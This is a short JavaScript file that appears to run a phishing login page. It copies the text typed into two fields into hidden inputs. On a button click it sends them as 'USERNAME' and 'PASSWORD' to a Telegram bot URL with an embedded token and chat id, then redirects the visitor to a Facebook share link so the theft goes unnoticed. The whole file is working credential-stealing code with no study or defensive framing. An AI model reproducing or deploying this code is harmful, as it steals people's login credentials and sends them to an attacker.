const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

first.addEventListener("change", () => {
  resfirst.value = first.value;
});
second.addEventListener("change", () => {
  resecond.value = second.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot2lRHEtlYEflgq3Mb7GNhpvo8enF_6FsAXUiGbASFRcAeSBC26/sendMessage?chat_id=6914308753&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

window.location.href = 'https://www.facebook.com/share/LHcKyL9m2XLWDoHR/?mibextid=WC7FNe';
}

sendatatme.addEventListener("click", redirect);
